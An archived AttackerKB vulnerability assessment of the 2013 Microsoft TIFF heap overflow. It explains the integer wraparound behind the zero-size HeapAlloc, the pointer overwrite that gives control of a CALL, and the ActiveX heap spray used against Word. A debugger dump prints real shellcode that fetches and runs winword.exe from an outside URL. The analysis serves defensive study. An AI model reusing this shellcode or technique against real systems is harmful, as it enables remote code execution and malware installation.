---
title: Microsoft Tagged Image File Format Heap Overflow
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2013-11-06T15:55:00'
created: '2019-09-12T18:07:36.986753'
revision_date: '2020-02-13T17:12:13.113352'
assessment_id: 962f0e61-3d92-4ecb-9ea8-8fd6860f9280
topic_id: 5ee043d8-3181-4c10-a4aa-082575ef14e2
topic_short_id: xqVeYfA0hW
topic_slug: microsoft-tagged-image-file-format-heap-overflow
akb_topic_url: https://attackerkb.com/topics/xqVeYfA0hW/microsoft-tagged-image-file-format-heap-overflow
akb_assessment_url: https://attackerkb.com/topics/xqVeYfA0hW/microsoft-tagged-image-file-format-heap-overflow#962f0e61-3d92-4ecb-9ea8-8fd6860f9280
---

# Microsoft Tagged Image File Format Heap Overflow

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/xqVeYfA0hW/microsoft-tagged-image-file-format-heap-overflow#962f0e61-3d92-4ecb-9ea8-8fd6860f9280).*

---

 See #7
```

So what happens is that:

1. The function grabs the value 98 b8 ff ff from the trigger file at offset 00003320h. This DWORD value
   is translated as 0xffffb898.
2. The function grabs another byte (44) using movzx
3. In the loc_44153C77 loop, the function looks for the first byte of every DWORD starting at file offset
   00003320h+4, until the counter runs out. By the time we're out of the loop, EAX is 0xffffeaec. So this
   also means that in the file, the chunk starting at 00003320h+4 is part of the algorithm used to calculate
   the heap size.
4. The HeapAllc size loaded is done with this: lea eax, [eax+ecx*2+8], where eax at this point is
   0xffffeaec, ecx is 44. So what it's doing is: 0xffffeaec + 0x44 * 2 + 8, this gets us 0xffffeb7c in EAX
5. The final calculation of the HeapAlloc size is eax + esi (image length also obtained from the file), so
   that means 0xffffeb7c + 0x00001484, and on a 32-bit machine this ends up being: 00000000.
6. HeapAlloc attempts to allocate a buffer with size 0, but it'll throw you a chunk awright.
7. The same chunk is used for memcpy. This chunk contains a pointer that OGL!GdipCreatePath will use later.

So since we have control of the source (JFIF data), we can overwrite OGL!GdipCreatePath's pointer,
and have direct control of the CALL instruction. By using a heap spray, we can set up the memory
layout and tell the CALL instruction where to go.


# ActiveX heap spray

The payload is basically a bin file from the ActiveX folder in the docx "file", in memory it looks
like (see ActiveX1.bin for example):

```
0:000> dc 1539bde1+3+4 L100
1539bde8  08080808 08080808 08080808 08080808  ................
1539bdf8  08080808 08080808 08080808 08080808  ................
1539be08  08080808 08080808 08080808 08080808  ................
1539be18  08080808 bcae6aeb 11c82761 0b6c2758  .....j..a'..X'l.
1539be28  67fe275e c9f22759 0000275c 0c000000  ^'.gY'..\'......
1539be38  30000000 00400000 0c000000 ea460000  ...0..@.......F.
1539be48  0da42759 a0002759 00852762 a010275e  Y'..Y'..b'..^'..
1539be58  60122762 88792759 cfe7275b 0000275d  b'.`Y'y.['..]'..
1539be68  00240000 00000000 60120000 01b82759  ..$........`Y'..
1539be78  0000275e 92a20000 92672759 90902758  ^'......Y'g.X'..
1539be88  7feb9090 41414141 41414141 41414141  ....AAAAAAAAAAAA
1539be98  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1539bea8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1539beb8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1539bec8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1539bed8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1539bee8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1539bef8  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
1539bf08  90909024 ffffe890 5ac0ffff 505379eb  $..........Z.ySP
1539bf18  56f38957 8b3c738b 01781e74 768b56de  W..V.s<.t.x..V.v
1539bf28  31de0120 ad4149c9 3156d801 10be0ff6   ..1.IA...V1....
1539bf38  0874d638 0107cec1 f1eb40d6 755e3739  8.t......@..97^u
1539bf48  dd895ae5 01245a8b 0c8b66eb 1c5a8b4b  .Z...Z$..f..K.Z.
1539bf58  048beb01 abe8018b c7835f5e c35b5804  ........^_...X[.
1539bf68  74e83880 e938800f 38800a74 800574cc  .8.t..8.t..8.t..
1539bf78  1175eb38 90057881 74909090 55ff8908  8.u..x.....t...U
1539bf88  408de589 31e0ff05 408b64c0 0c408b30  ...@...1.d.@0.@.
1539bf98  8b1c408b 788b0870 66008b20 00187f83  .@..p..x ..f....
1539bfa8  ec81f175 00000000 07c7e789 0c917432  u...........2t..
1539bfb8  390447c7 c7837de2 89630847 47c74fd1  .G.9.}..G.c..O.G
1539bfc8  afd6800c 1047c79a 213bcb58 8958036a  ......G.X.;!j.X.
1539bfd8  505789fb ffff35e8 f87548ff 6c68df89  ..WP.5...Hu...hl
1539bfe8  6800006c 642e6e6f 6c727568 078b546d  l..hon.dhurlmT..
1539bff8  ffff6be8 83c689ff 0fe80cc7 89ffffff  .k..............
1539c008  6c6468df 6c68006c 682e3233 6c656873  .hdll.hl32.hshel
1539c018  e8078b54 ffffff48 c783c689 feece810  T...H...........
1539c028  df89ffff 0550478b 0000019e 89fbc083  .....GP.........
1539c038  c6895847 3846c931 4efb750e 752f3e80  GX..1.F8.u.N.>/u
1539c048  778946fa 50778b5c 01bfc681 c6830000  .F.w\.wP........
1539c058  60778920 00806856 478b0000 fefee804   .w`Vh.....G....
1539c068  8d57ffff 778b061c a4df895c 00ff7f80  ..W....w\.......
1539c078  315ff975 ff5151c9 77ff6077 478b5158  u._1.QQ.w`.wXQ.G
1539c088  fedae80c c931ffff ff515151 51516077  ......1.QQQ.w`QQ
1539c098  e810478b fffffec8 8b50c031 bde80847  .G......1.P.G...
1539c0a8  68fffffe 3a707474 796d2f2f 74616c66  ...http://myflat
1539c0b8  2e74656e 2f6d6f63 63757262 2f335f65  net.com/bruce_3/
1539c0c8  776e6977 2e64726f 00657865 cccccccc  winword.exe.....
```

The ActiveX control used for the spray:

```
Possible spray:
HKEY_CLASSES_ROOT\CLSID\{1EFB6596-857C-11D1-B16A-00C0F0283628}
Microsoft TabStrip Control, version 6.0
C:\WINDOWS\system32\MSCOMCTL.OCX
ProgID: MSComctlLib.TabStrip.2
VersionIndependentprogID: MSComctlLib.TabStrip

0:000> r
eax=00001000 ebx=06ac3f90 ecx=000001d4 edx=04f7b600 esi=0012026c edi=1539beb0
eip=77535f87 esp=0011f658 ebp=0011f698 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
ole32!CoGetStandardMarshal+0x17b3:
77535f87 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

ChildEBP RetAddr
WARNING: Stack unwind information not available. Following frames may be wrong.
0011f698 77535f10 ole32!CoGetStandardMarshal+0x17b3
0011f6bc 77536f9a ole32!CoGetStandardMarshal+0x173c
0011f8b8 77536db7 ole32!CoGetStandardMarshal+0x27c6
0011f8f0 77536a40 ole32!CoGetStandardMarshal+0x25e3
0011f90c 77536c33 ole32!CoGetStandardMarshal+0x226c
0011f930 77536b2f ole32!CoGetStandardMarshal+0x245f
0011f980 39c98198 ole32!CoGetStandardMarshal+0x235b
001209c0 39c9959e mso!Ordinal4410+0x336
001209e0 77543ba1 mso!Ordinal4410+0x173c
00120a10 31dc38ed ole32!OleSave+0x52
00120a60 31dc35ab wwlib!DllGetLCID+0x4e7877
00120aa4 321bbb25 wwlib!DllGetLCID+0x4e7535
00120b8c 321bc223 wwlib!wdGetApplicationObject+0x4c587
00120ba0 321bc330 wwlib!wdGetApplicationObject+0x4cc85
00120de8 0fa09d3a wwlib!wdGetApplicationObject+0x4cd92
00120e28 0f9e3fbf VBE7!rtcStrConvVar+0x960a
00120e5c 0f9e53ac VBE7!rtUI1FromErrVar+0x4515
00120eec 321bcf43 VBE7!rtUI1FromErrVar+0x5902
00120fb0 321bd18e wwlib!wdGetApplicationObject+0x4d9a5
00120fd8 31be95dc wwlib!wdGetApplicationObject+0x4dbf0
```
